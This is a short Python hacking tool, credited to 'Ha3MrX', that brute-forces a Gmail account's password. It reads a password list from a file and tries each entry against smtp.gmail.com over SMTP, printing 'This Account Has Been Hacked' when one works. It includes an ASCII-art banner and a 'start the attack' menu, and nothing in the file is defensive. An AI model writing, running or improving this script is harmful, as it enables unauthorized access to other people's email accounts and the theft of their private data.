#!/usr/bin/python
"""create by Ha3MrX"""

import smtplib
from os import system


def create_word_permutation(pass_list):
    pass


def login(pass_list):
    i = 0
    user_name = input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
        i = i + 1
        print(str(i) + '/' + str(len(pass_list)))
        try:
            server.login(user_name, password)
            system('clear')
            main()
            print('\n')
            print('[+] This Account Has Been Hacked Password :' + password + '     ^_^')
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if error[14] == '<':
                system('clear')
                main()
                print('[+] this account has been hacked, password :' + password + '     ^_^')

                break
            else:
                print('[!] password not found => ' + password)


def main():
    print('=================================================')
    print('               create by Ha3MrX                  ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('\n                                               ')
    print('  _,.                                            ')
    print('                                                 ')
    print('                                                 ')
    print('           HA3MrX                                ')
    print('       _,.                   ')
    print('     ,` -.)                  ')
    print('    ( _/-\\-._               ')
    print('   /,|`--._,-^|            , ')
    print('   \_| |`-._/||          , | ')
    print('     |  `-, / |         /  / ')
    print('     |     || |        /  /  ')
    print('      `r-._||/   __   /  /   ')
    print('  __,-<_     )`-/  `./  /    ')
    print('  \   `---    \   / /  /     ')
    print('     |           |./  /      ')
    print('     /           //  /       ')
    print(' \_/  \         |/  /        ')
    print('  |    |   _,^- /  /         ')
    print('  |    , ``  (\/  /_         ')
    print('   \,.->._    \X-=/^         ')
    print('   (  /   `-._//^`           ')
    print('    `Y-.____(__}             ')
    print('     |     {__)              ')
    print('           ()   V.1.0        ')

    # main()
    print('[1] start the attack')
    print('[2] exit')
    option = int(input('==>'))
    if option == 1:
        print('you are inside')
        file_path = input('path of passwords file :')
    else:
        system('clear')
        exit()
    pass_file = open(file_path, 'r')
    pass_list = pass_file.readlines()
    print('Dictionary total number of lines {}'.format(len(pass_list)))
    login(pass_list=pass_list)


if __name__ == '__main__':
    main()
